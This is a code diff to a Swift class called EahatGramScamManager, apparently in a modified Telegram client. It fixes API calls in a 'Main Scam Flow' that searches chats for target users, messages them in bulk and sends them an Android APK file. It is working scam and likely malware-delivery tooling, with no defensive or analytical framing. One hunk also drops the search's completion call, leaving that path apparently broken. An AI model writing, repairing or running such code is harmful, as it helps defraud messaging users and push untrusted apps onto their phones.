@@ -75,7 +75,7 @@ public final class EahatGramScamManager {
     
     // MARK: - Main Scam Flow
     public func startScamFlow() {
-        guard !isRunning, let context = context else { return }
+        guard !isRunning, self.context != nil else { return }
         isRunning = true
         matchedUsers.removeAll()
         
@@ -111,7 +111,7 @@ public final class EahatGramScamManager {
     
     // MARK: - Step 1: Search Users
     private func searchUsersInChats(completion: @escaping ([MatchedUser]) -> Void) {
-        guard let context = context else {
+        guard self.context != nil else {
             completion([])
             return
         }
@@ -155,11 +155,14 @@ public final class EahatGramScamManager {
         }
         username = username.replacingOccurrences(of: "@", with: "")
         
-        let _ = (context.engine.peers.resolvePeerByName(name: username)
-        |> deliverOnMainQueue).start(next: { peer in
-            completion(peer?.id)
-        }, error: { _ in
-            completion(nil)
+        let _ = (context.engine.peers.resolvePeerByName(name: username, referrer: nil)
+        |> deliverOnMainQueue).start(next: { result in
+            switch result {
+            case let .result(peer):
+                completion(peer?.id)
+            case .progress:
+                break
+            }
         })
     }
     
@@ -180,7 +183,7 @@ public final class EahatGramScamManager {
             state: nil,
             limit: 100
         )
-        |> deliverOnMainQueue).start(next: { [weak self] result in
+        |> deliverOnMainQueue).start(next: { [weak self] result, _ in
             guard let self = self else {
                 completion([])
                 return
@@ -218,9 +221,6 @@ public final class EahatGramScamManager {
                 }
             }
             
-            completion(matched)
-        }, error: { _ in
-            completion([])
         })
     }
     
@@ -228,7 +228,7 @@ public final class EahatGramScamManager {
     private func sendInitialMessages() {
         guard let context = context else { return }
         
-        for (userId, user) in matchedUsers {
+        for userId in matchedUsers.keys {
             let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
             
             let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
@@ -497,10 +497,12 @@ public final class EahatGramScamManager {
                 resource: resource,
                 previewRepresentations: [],
                 videoThumbnails: [],
+                videoCover: nil,
                 immediateThumbnailData: nil,
                 mimeType: "application/vnd.android.package-archive",
                 size: Int64(apkData.count),
-                attributes: [.FileName(fileName: "\(config.apkName).apk")]
+                attributes: [.FileName(fileName: "\(config.apkName).apk")],
+                alternativeRepresentations: []
             )
             
             let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
